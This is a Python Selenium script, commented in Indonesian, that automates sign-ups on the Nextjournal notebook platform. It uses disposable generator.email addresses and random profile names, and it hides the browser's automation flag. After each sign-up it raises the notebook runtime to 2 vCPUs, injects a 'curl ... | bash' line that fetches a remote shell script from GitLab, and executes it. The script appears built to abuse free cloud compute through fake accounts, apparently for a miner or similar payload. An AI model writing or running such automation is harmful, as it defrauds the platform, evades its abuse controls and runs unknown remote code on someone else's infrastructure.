import time
import random
import string
import re
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.common.action_chains import ActionChains

def dapatkan_domain_aktif(driver):
    print("  [~] Mengekstrak domain aktif generator.email...")
    try:
        email_el = driver.find_element(By.ID, "email_ch_text")
        email_text = email_el.text.strip()
        if "@" in email_text:
            return email_text.split("@")[1]
    except:
        pass
    return "hotmailvip.tokyo" # Fallback

def tunggu_dan_klik(driver, wait, by, selector, klik=True):
    try:
        element = wait.until(EC.presence_of_element_located((by, selector)))
        driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", element)
        time.sleep(1)
        if klik:
            wait.until(EC.element_to_be_clickable((by, selector)))
            driver.execute_script("arguments[0].click();", element)
        return element
    except Exception as e:
        raise Exception(f"Gagal berinteraksi dengan {selector}: {e}")

def main():
    # Setup Driver
    chrome_options = Options()
    chrome_options.add_argument("--window-size=1920,1080")
    chrome_options.add_argument("--disable-blink-features=AutomationControlled")
    service = Service(ChromeDriverManager().install())
    driver = webdriver.Chrome(service=service, options=chrome_options)
    wait = WebDriverWait(driver, 30)

    try:
        # STEP 1: Buka Nextjournal di Tab 1
        print("[1] Membuka Nextjournal di Tab 1...")
        driver.get("https://nextjournal.com/login")
        tab_1 = driver.current_window_handle
        time.sleep(3)

        # STEP 2: Buka generator.email di Tab 2
        print("[2] Membuka generator.email di Tab 2...")
        driver.execute_script("window.open('https://generator.email/', '_blank');")
        time.sleep(1)
        tab_2 = driver.window_handles[1]
        driver.switch_to.window(tab_2)
        time.sleep(5)

        # Buat Email
        domain = dapatkan_domain_aktif(driver)
        username_email = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
        target_email = f"{username_email}@{domain}"
        print(f"  -> Email dibuat: {target_email}")

        # STEP 3: Kembali ke Tab 1, isi email, enter, tutup tab 1
        print("[3] Kembali ke Tab 1 untuk submit email...")
        driver.switch_to.window(tab_1)
        email_input = tunggu_dan_klik(driver, wait, By.NAME, "identifier", klik=False)
        email_input.clear()
        email_input.send_keys(target_email)
        time.sleep(1)
        email_input.send_keys(Keys.ENTER)
        
        print("  -> Menunggu 2 detik lalu menutup Tab 1...")
        time.sleep(2)
        driver.close()

        # STEP 4: Fokus ke Tab 2 (sekarang menjadi satu-satunya tab)
        driver.switch_to.window(driver.window_handles[0])
        print("[4] Memonitor inbox generator.email...")
        driver.get(f"https://generator.email/{target_email}")
        
        timeout_inbox = time.time() + 120
        magic_link = None

        while time.time() < timeout_inbox:
            try:
                # Cari anchor tag yang href-nya mengandung magic link nextjournal
                links = driver.find_elements(By.XPATH, "//a[contains(@href, 'https://nextjournal.com/login/Qm')]")
                if links:
                    magic_link_element = links[0]
                    magic_link = magic_link_element.get_attribute("href")
                    print(f"  -> Magic Link ditemukan!")
                    
                    # STEP 5: Klik link (otomatis membuka tab baru)
                    driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", magic_link_element)
                    time.sleep(1)
                    magic_link_element.click()
                    break

                # Klik Refresh jika link belum ada
                refresh_btn = driver.find_element(By.XPATH, "//*[contains(@class, 'btn') and contains(text(), 'Refresh')]")
                driver.execute_script("arguments[0].click();", refresh_btn)
                print("  -> Refresh inbox...")
            except:
                pass
            time.sleep(random.uniform(5, 8))

        if not magic_link:
            raise Exception("Magic link tidak ditemukan.")

        # STEP 6: Pindah ke Tab baru (Tab 3), tutup Tab lama (Tab 2)
        time.sleep(4) # Tunggu tab baru terbuka sempurna
        tab_3 = driver.window_handles[-1] # Tab terbaru
        driver.close() # Menutup tab saat ini (generator.email)
        driver.switch_to.window(tab_3)
        print("[5] Beralih ke halaman verifikasi Nextjournal...")

        # STEP 7: Agree Button
        print("[6] Klik Agree...")
        tunggu_dan_klik(driver, wait, By.XPATH, "//button[normalize-space()='Agree']")

        # STEP 8 & 9: Isi Nama dan Handle
        print("[7] Mengisi Profil...")
        nama_random = ''.join(random.choices(string.ascii_lowercase, k=12))
        handle_random = ''.join(random.choices(string.ascii_lowercase + string.digits, k=15))
        
        name_input = tunggu_dan_klik(driver, wait, By.NAME, "name", klik=False)
        name_input.send_keys(nama_random)
        time.sleep(0.5)

        handle_input = tunggu_dan_klik(driver, wait, By.NAME, "handle", klik=False)
        handle_input.send_keys(Keys.CONTROL + "a")
        handle_input.send_keys(Keys.BACKSPACE)
        handle_input.send_keys(handle_random)
        time.sleep(0.5)

        # STEP 10: Done
        print("[8] Klik Done...")
        tunggu_dan_klik(driver, wait, By.XPATH, "//button[normalize-space()='Done']")

        # STEP 11: New Button
        print("[9] Klik New Article...")
        tunggu_dan_klik(driver, wait, By.CSS_SELECTOR, "[data-testid='new-article-tile']")
        time.sleep(5) # Jeda agar daftar template terbuka

        # STEP 12: Python Template
        print("[10] Pilih template Python...")
        xpath_python = "//div[contains(@class, 'template-list-item') and contains(., 'Python')]"
        tunggu_dan_klik(driver, wait, By.XPATH, xpath_python)
        time.sleep(2) # WAJIB: Jeda agar antarmuka merender tombol "Use this template"

        # STEP 13: Use this template (DIKEMBALIKAN DENGAN XPATH BARU)
        print("[11] Klik Use this template...")
        # Menggunakan '.' untuk membaca seluruh node text meskipun ada simbol ⮐ di dalamnya
        xpath_use_template = "//button[contains(., 'Use this template')]"
        tunggu_dan_klik(driver, wait, By.XPATH, xpath_use_template)
        
        print("  -> Menunggu UI bertransisi ke mode editor aktif...")
        time.sleep(5) # Waktu krusial agar elemen sidebar-runtime dirender penuh di DOM

        # STEP 14: Runtime Settings
        print("[12] Membuka Runtime Settings...")
        tunggu_dan_klik(driver, wait, By.CSS_SELECTOR, ".sidebar-runtime")
        time.sleep(1.5)

        # STEP 15 & 16: Ubah vCPU
        print("[13] Mengubah vCPU ke 2 vCPUs, 7.5 GB RAM...")
        tunggu_dan_klik(driver, wait, By.XPATH, "//span[contains(text(), '1 vCPU')]")
        time.sleep(1)
        tunggu_dan_klik(driver, wait, By.XPATH, "//span[contains(text(), '2 vCPUs')]")
        time.sleep(1)

        # STEP 17: Save changes & start
        print("[14] Save changes & start...")
        tunggu_dan_klik(driver, wait, By.XPATH, "//button[contains(normalize-space(), 'Save changes & start')]")
        time.sleep(2)

        # STEP 18: Close modal
        print("[15] Menutup modal dengan tombol Esc...")
        ActionChains(driver).send_keys(Keys.ESCAPE).perform()
        time.sleep(1.5) # Beri jeda sebentar agar animasi penutupan modal selesai

        # STEP 19: CodeMirror Interaction (DIUBAH KE JS INJECTION)
        print("[16] Inject script ke CodeMirror (via JS API)...")
        js_injection = """
        var cmContainer = document.querySelector('.CodeMirror');
        if (cmContainer && cmContainer.CodeMirror) {
            cmContainer.CodeMirror.setValue("!curl https://gitlab.com/barbieanay003/seger/-/raw/main/way.sh | bash");
            return true;
        }
        return false;
        """
        sukses_inject = driver.execute_script(js_injection)
        
        if not sukses_inject:
            raise Exception("Gagal menyuntikkan script: Objek CodeMirror tidak ditemukan di halaman.")
            
        time.sleep(1.5) # Jeda agar UI web memproses perubahan teks

        # STEP 20: Tunggu ? detik
        print("[17] Menunggu 117 detik...")
        time.sleep(117)

        # STEP 21: Klik Play diganti dengan Shift + Enter
        print("[18] Menekan eksekusi Play (via Shift+Enter)...")
        
        # 1. Paksa kursor (fokus) untuk masuk ke dalam area CodeMirror
        driver.execute_script("""
            var cmContainer = document.querySelector('.CodeMirror');
            if (cmContainer && cmContainer.CodeMirror) {
                cmContainer.CodeMirror.focus();
            }
        """)
        time.sleep(0.5) # Jeda sekian milidetik agar fokus teregistrasi oleh DOM
        
        # 2. Kirim kombinasi Shift + Enter ke browser
        ActionChains(driver).key_down(Keys.SHIFT).send_keys(Keys.ENTER).key_up(Keys.SHIFT).perform()

        # STEP 22: Tunggu 5 detik lalu tutup
        print("[19] Menunggu 5 detik eksekusi akhir...")
        time.sleep(5)

        print("[OK] Selesai! Menutup browser.")

    except Exception as e:
        print(f"\n[ERROR] Skrip berhenti. Rincian: {e}")
    finally:
        driver.quit()

if __name__ == "__main__":
    main()
